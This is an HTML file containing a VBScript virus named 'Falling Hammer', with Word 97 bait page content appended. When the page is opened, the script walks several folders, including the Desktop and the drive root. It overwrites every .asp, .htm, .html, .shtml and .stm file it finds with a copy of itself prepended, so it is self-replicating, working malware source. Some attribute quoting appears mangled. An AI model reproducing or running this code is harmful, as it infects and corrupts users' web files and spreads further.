<META NAME=Version CONTENT=Fixed/b>
<META NAME=Author CONTENT=KSG>
<META NAME=Virus Name CONTENT=Falling Hammer>
<html><body>

<OBJECT classid='3D"clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"'='id=3D"Vandelay"'></OBJECT>
<OBJECT classid='3D"clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"'='id=3D"SoupNazi"'></OBJECT>
<SCRIPT language=VBScript>
On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")

Set FSO = CreateObject("Scripting.FileSystemObject")
Path = Replace(location.href, "/", "\")
Path = Replace(Path, "file:\\\", "")
Path = FSO.GetParentFolderName(Path)
Set TRange = document.body.createTextRange

Call GetFolder(Path)
Call GetFolder("C:\tmp")
Call GetFolder(".")
call getfolder("\")
call getfolder(WSHShell.SpecialFolder("Desktop"))

Sub GetFolder(InfPath)
On Error Resume Next
if FSO.FolderExists(InfPath) then
    Do
    Set FolderObj = FSO.GetFolder(InfPath)
    InfPath = FSO.GetParentFolderName(InfPath)
    Set FO = FolderObj.Files
    For each target in FO
        ExtName = lcase(FSO.GetExtensionName(target.Name))
        if ExtName = "asp" or ExtName = "shtml" or ExtName = "stm" or ExtName = "htm" or ExtName = "html" then
            Set Real = FSO.OpenTextFile(target.path, 1, False)
            if Real.readline <> "<META NAME=Version CONTENT=Fixed/b>" then
                Real.close()
                GetFile(target.path)
            else
                Real.close()
            end if
        end if
    next
    Loop Until FolderObj.IsRootFolder = True
end if
End Sub
Sub GetFile(GetFileName)
    Set Real = FSO.OpenTextFile(GetFileName, 1, False)
    FileContents = Real.ReadAll()
    Real.close()
    Set Real = FSO.OpenTextFile(GetFileName, 2, False)
    Real.WriteLine "<META NAME=Version CONTENT=Fixed/b>"
    Real.WriteLine "<META NAME=Author CONTENT=KSG>"
    Real.WriteLine "<META NAME=Virus Name CONTENT=Falling Hammer">
    Real.Write("<html><body>" + Chr(13) + Chr(10))
    Real.WriteLine TRange.htmlText
    Real.WriteLine("")
    Real.Write(FileContents)
    Real.close()
End Sub
-->
</SCRIPT>

<HTML>
<HEAD>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
<META NAME="Generator" CONTENT="Microsoft Word 97">
<META NAME="Template" CONTENT="c:\hp\i\ms\off97pro\32.0\office\html.dot">
</HEAD>
<BODY LINK="#0000ff" VLINK="#800080">

<P ALIGN="CENTER"><HR></P>
<B><FONT SIZE=7 COLOR="#0000ff"><P ALIGN="CENTER">HTML Bait File!</P>
</B></FONT><P ALIGN="CENTER"><HR></P>
</BODY>
</HTML>
